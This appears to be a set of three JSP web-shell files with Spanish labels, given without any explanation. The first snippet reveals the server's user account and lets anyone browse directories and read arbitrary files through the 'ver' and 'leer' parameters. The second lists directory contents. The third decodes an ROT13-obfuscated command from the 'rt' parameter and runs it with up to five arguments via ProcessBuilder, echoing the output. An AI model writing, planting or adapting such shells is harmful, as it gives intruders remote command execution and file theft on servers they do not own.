<%@ page import="java.io.*" %>
<%
    out.println("<p>Usuario actual del sistema: <strong>" + System.getProperty("user.name") + "</strong></p>");

    String ruta = request.getParameter("ver");
    String archivo = request.getParameter("leer");

    if (archivo != null) {
        File f = new File(archivo);
        if (f.exists() && f.isFile()) {
            BufferedReader br = new BufferedReader(new FileReader(f));
            String linea;
            out.println("<pre>");
            while ((linea = br.readLine()) != null) {
                out.println(linea);
            }
            out.println("</pre>");
            br.close();
        } else {
            out.println("Archivo no válido.");
        }
    } else {
        if (ruta == null || ruta.trim().isEmpty()) ruta = ".";
        File carpeta = new File(ruta);
        if (carpeta.exists() && carpeta.isDirectory()) {
            out.println("<h3>Contenido de: " + carpeta.getCanonicalPath() + "</h3>");
            File[] lista = carpeta.listFiles();
            if (lista != null) {
                for (File f : lista) {
                    String tipo = f.isDirectory() ? "[DIR] " : "[FILE]";
                    String enlace = f.isDirectory() ? "?ver=" + f.getCanonicalPath() : "?leer=" + f.getCanonicalPath();
                    out.println(tipo + "<a href='" + enlace + "'>" + f.getName() + "</a><br>");
                }
            } else {
                out.println("No se pudo acceder al contenido del directorio.");
            }
        } else {
            out.println("Ruta inválida.");
        }
    }
%>


<%@ page import="java.io.*" %>
<%
    String ruta = request.getParameter("ver");
    if (ruta == null) ruta = ".";
    File carpeta = new File(ruta);
    if (carpeta.exists() && carpeta.isDirectory()) {
        for (File f : carpeta.listFiles()) {
            out.println(f.getName() + "<br>");
        }
    }
%>



<%@ page import="java.io.*" %>
<%
    String curiosity = request.getParameter("rt");
    if (curiosity == null || curiosity.isEmpty()) {
        out.println("No se ha especificado el curiosity");
        return;
    }

    String arg1 = request.getParameter("arg1");
    String arg2 = request.getParameter("arg2");
    String arg3 = request.getParameter("arg3");
    String arg4 = request.getParameter("arg4");
    String arg5 = request.getParameter("arg5");

    java.util.List<String> constantino = new java.util.ArrayList<>();

    StringBuilder result = new StringBuilder();
    for (char c : curiosity.toCharArray()) {
        if (c >= 'a' && c <= 'z') {
            result.append((char) ('a' + (c - 'a' + 13) % 26));
        } else if (c >= 'A' && c <= 'Z') {
            result.append((char) ('A' + (c - 'A' + 13) % 26));
        } else {
            result.append(c); // Dejar caracteres no alfabéticos sin cambios
        }
    }
    
    constantino.add(result.toString());

    if(arg1 != null && !arg1.isEmpty()) constantino.add(arg1);
    if(arg2 != null && !arg2.isEmpty()) constantino.add(arg2);
    if(arg3 != null && !arg3.isEmpty()) constantino.add(arg3);
    if(arg4 != null && !arg4.isEmpty()) constantino.add(arg4);
    if(arg5 != null && !arg5.isEmpty()) constantino.add(arg5);

    ProcessBuilder pb = new ProcessBuilder(constantino);
    pb.redirectErrorStream(true);

    Process process = pb.start();
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

    String line;
    out.println("<pre>");
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");

    process.waitFor();
%>

